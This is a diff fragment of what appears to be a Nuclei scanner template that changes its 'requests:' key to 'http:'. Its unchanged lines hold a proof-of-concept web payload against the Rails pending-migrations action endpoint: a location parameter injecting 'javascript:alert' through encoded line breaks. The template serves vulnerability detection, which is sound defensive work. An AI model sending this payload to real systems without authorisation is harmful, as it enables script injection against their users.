@@ -12,7 +12,7 @@ info:
   #  Working poc by @Mad-robot
   # /rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0Djavascript%3Aalert%28document.domain%29
 
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
